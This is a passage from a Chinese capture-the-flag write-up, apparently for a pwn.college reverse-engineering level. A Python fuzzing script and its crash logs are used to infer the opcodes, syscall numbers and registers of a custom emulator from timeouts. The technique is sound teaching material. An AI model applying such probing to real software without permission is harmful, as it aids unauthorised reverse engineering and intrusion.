class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>command= [<span class="hljs-string">&#x27;/challenge/babyrev-level-22-0&#x27;</span>]<br><br>data = <span class="hljs-built_in">bytearray</span>()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-string">&#x27;&#x27;</span>)<br><br>values = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> values:<br>    data.append(<span class="hljs-number">0x31</span>) <span class="hljs-comment"># arg1不相关，因此可以随便设置一个。但是得设置！</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> values:<br>        data.append(j)<br>        data.append(i)<br>        <span class="hljs-built_in">print</span>(data.<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">try</span>:<br>            res = subprocess.run(command,<span class="hljs-built_in">input</span>=data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,timeout=<span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res.txt&#x27;</span>,<span class="hljs-string">&#x27;ab&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                file.write(data.<span class="hljs-built_in">hex</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>                file.write(res.stdout[<span class="hljs-number">1074</span>:])<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;timeout&quot;</span>,data.<span class="hljs-built_in">hex</span>())<br>        data.pop()<br>        data.pop()<br>    data.clear()<br></code></pre></td></tr></table></figure><p>对于22.0跑出来的结果如下（过滤出超时的部分）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">timeout</span> <span class="hljs-number">310108</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310208</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310408</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310808</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">311008</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">312008</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">314008</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">318008</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310120</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310220</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310420</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">310820</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">311020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">314020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">318020</span><br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><code class="hljs inform7">310101<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> ADD ? c<br>Machine CRASHED due to: unknown register<br>310201<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> ADD ? s<br>Machine CRASHED due to: unknown register<br>310401<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> ADD ? a<br>Machine CRASHED due to: unknown register<br>310801 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> ADD ? f<br>Machine CRASHED due to: unknown register<br>311001 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> ADD ? d<br>Machine CRASHED due to: unknown register<br>312001 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> ADD ? ?<br>Machine CRASHED due to: unknown register<br>314001 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> ADD ? b<br>Machine CRASHED due to: unknown register<br>318001 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x1 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> ADD ? i<br>Machine CRASHED due to: unknown register<br>310102<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> IMM ? = 0x1<br>Machine CRASHED due to: unknown register<br>310202 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> IMM ? = 0x2<br>Machine CRASHED due to: unknown register<br>310402<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> IMM ? = 0x4<br>Machine CRASHED due to: unknown register<br>310802 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> IMM ? = 0x8<br>Machine CRASHED due to: unknown register<br>311002<br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> IMM ? = 0x10<br>Machine CRASHED due to: unknown register<br>312002 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> IMM ? = 0x20<br>Machine CRASHED due to: unknown register<br>314002 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> IMM ? = 0x40<br>Machine CRASHED due to: unknown register<br>318002 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x2 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> IMM ? = 0x80<br>Machine CRASHED due to: unknown register<br>310104 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> STK ? c<br><span class="hljs-comment">[s]</span> ... pushing c<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>310204 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> STK ? s<br><span class="hljs-comment">[s]</span> ... pushing s<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>310404 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> STK ? a<br><span class="hljs-comment">[s]</span> ... pushing a<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>310804 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> STK ? f<br><span class="hljs-comment">[s]</span> ... pushing f<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>311004 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> STK ? d<br><span class="hljs-comment">[s]</span> ... pushing d<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>312004 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> STK ? ?<br><span class="hljs-comment">[s]</span> ... pushing ?<br>Machine CRASHED due to: unknown register<br>314004 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> STK ? b<br><span class="hljs-comment">[s]</span> ... pushing b<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>318004 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x4 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> STK ? i<br><span class="hljs-comment">[s]</span> ... pushing i<br><span class="hljs-comment">[s]</span> ... popping ?<br>Machine CRASHED due to: unknown register<br>310110 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> LDM ? = *c<br>Machine CRASHED due to: unknown register<br>310210 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> LDM ? = *s<br>Machine CRASHED due to: unknown register<br>310410 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> LDM ? = *a<br>Machine CRASHED due to: unknown register<br>310810 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> LDM ? = *f<br>Machine CRASHED due to: unknown register<br>311010 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> LDM ? = *d<br>Machine CRASHED due to: unknown register<br>312010 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> LDM ? = *?<br>Machine CRASHED due to: unknown register<br>314010 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> LDM ? = *b<br>Machine CRASHED due to: unknown register<br>318010 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x10 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> LDM ? = *i<br>Machine CRASHED due to: unknown register<br>312020 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x20 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> SYS 0x31 ?<br><span class="hljs-comment">[s]</span> ... <span class="hljs-keyword">open</span><br>Machine CRASHED due to: unknown register<br>310140 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> STM *? = c<br>Machine CRASHED due to: unknown register<br>310240 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> STM *? = s<br>Machine CRASHED due to: unknown register<br>310440 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> STM *? = a<br>Machine CRASHED due to: unknown register<br>310840 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> STM *? = f<br>Machine CRASHED due to: unknown register<br>311040 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> STM *? = d<br>Machine CRASHED due to: unknown register<br>312040 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> STM *? = ?<br>Machine CRASHED due to: unknown register<br>314040 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> STM *? = b<br>Machine CRASHED due to: unknown register<br>318040 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x40 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> STM *? = i<br>Machine CRASHED due to: unknown register<br>310180 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x1<br><span class="hljs-comment">[s]</span> CMP ? c<br>Machine CRASHED due to: unknown register<br>310280 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x2<br><span class="hljs-comment">[s]</span> CMP ? s<br>Machine CRASHED due to: unknown register<br>310480 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x4<br><span class="hljs-comment">[s]</span> CMP ? a<br>Machine CRASHED due to: unknown register<br>310880 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x8<br><span class="hljs-comment">[s]</span> CMP ? f<br>Machine CRASHED due to: unknown register<br>311080 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x10<br><span class="hljs-comment">[s]</span> CMP ? d<br>Machine CRASHED due to: unknown register<br>312080 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x20<br><span class="hljs-comment">[s]</span> CMP ? ?<br>Machine CRASHED due to: unknown register<br>314080 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x40<br><span class="hljs-comment">[s]</span> CMP ? b<br>Machine CRASHED due to: unknown register<br>318080 <br><span class="hljs-comment">[V]</span> a:0 b:0 c:0 d:0 s:0 i:0x1 f:0<br><span class="hljs-comment">[I]</span> op:0x80 arg1:0x31 arg2:0x80<br><span class="hljs-comment">[s]</span> CMP ? i<br>Machine CRASHED due to: unknown register<br></code></pre></td></tr></table></figure><p>根据观察，可以发现：IMM，ADD，STK，LDM，STM和CMP不会出现Timeout。SYS和JMP会出现超时， <strong>但是SYS open不会出现超时。</strong> </p><p>那么回推到level22.1：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">300101</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300101</span><br><span class="hljs-attribute">300201</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300201</span><br><span class="hljs-attribute">300401</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300401</span><br><span class="hljs-attribute">300801</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300801</span><br><span class="hljs-attribute">301001</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">301001</span><br><span class="hljs-attribute">302001</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">302001</span><br><span class="hljs-attribute">304001</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">304001</span><br><span class="hljs-attribute">308001</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">308001</span><br><span class="hljs-attribute">300120</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300120</span><br><span class="hljs-attribute">300220</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300220</span><br><span class="hljs-attribute">300420</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300420</span><br><span class="hljs-attribute">300820</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">300820</span><br><span class="hljs-attribute">301020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">301020</span><br><span class="hljs-attribute">302020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">302020</span><br><span class="hljs-attribute">304020</span><br><span class="hljs-attribute">308020</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">308020</span><br></code></pre></td></tr></table></figure><p>能够确定，<code>01</code>是JMP指令，<code>20</code>是SYS指令。且<code>xx4020</code>是open syscall。</p><p>然后我们把arg1改成<code>0x00</code>后发现（timeout设置为1）：</p><p>对level22.0来说，JMP，STK和SYS都会超时7个。</p><p>对于level22.1来说，<code>01</code>，<code>80</code>会超时7个，<code>20</code>会超时8个。</p><blockquote><p><code>80</code>是STK指令</p></blockquote><p>把arg1改成<code>0x10</code>后发现：</p><p>对于level22.0来说，JMP和IMM都会超时8个，其余超时7个。</p><p>对于level22.1来说，<code>01</code>和<code>02</code>超时8个，其余超时7个。</p><blockquote><p><code>02</code>是IMM指令</p></blockquote><p>把arg1改成<code>0x20</code>后发现：</p><p>对于level22.0来说，JMP超时8个，SYS超时7个（open不超时），其余不超时。</p><p>对于level22.1来说，<code>01</code>和<code>02</code>超时8个，其余超时7个。</p><p>把arg1改成<code>0x40</code>后发现：</p><p>对于level22.0来说，SYS都不超因为是<code>exit</code>，JMP，IMM全超时，其余超时7个。</p><p>对于level22.1来说，opcode<code>20</code>和opcode<code>01</code>超时。其余都不超时。</p><p>把arg1改成<code>0x01</code>后发现：</p><p>对于level22.1来说，SYS都不超时，JMP和IMM超时8个。其余超时7个，因此结合0x40参数来说，可以确定0x01是exit参数。随后可以使用imm + exit来确定i寄存器的位置。超时说明imm赋值了i寄存器，导致控制流改变，没有正确退出。得出<code>i</code>为<code>08</code></p><p>总结一下：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">JMP</span>: 01<br><span class="hljs-attribute">IMM</span>: 02<br><span class="hljs-attribute">SYS</span>: 20|open:40exit:01<br><span class="hljs-attribute">STK</span>: 80<br><span class="hljs-attribute">STM</span>: ?<br><span class="hljs-attribute">LDM</span>: ?<br><span class="hljs-attribute">ADD</span>: ?<br><span class="hljs-attribute">CMP</span>: ?<br><span class="hljs-literal">-</span>------------------------------------<br><span class="hljs-attribute">a</span>: ?<br><span class="hljs-attribute">b</span>: ?<br><span class="hljs-attribute">c</span>: ?<br><span class="hljs-attribute">d</span>: ?<br><span class="hljs-attribute">s</span>: ?<br><span class="hljs-attribute">i</span>: 08<br><span class="hljs-attribute">f</span>: ?<br></code></pre></td></tr></table></figure><p>到这儿以后，根据之前的shellcode发现，指令这块儿只拿到<code>STM</code>就够了。那么如何让STM在<code>LDM,ADD,CMP</code>中脱颖而出呢？依然是改变<code>i</code>寄存器的值，只要这个改变，那么控制流就会改变。而ADD和LDM都会改变i的值，因此会超时。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 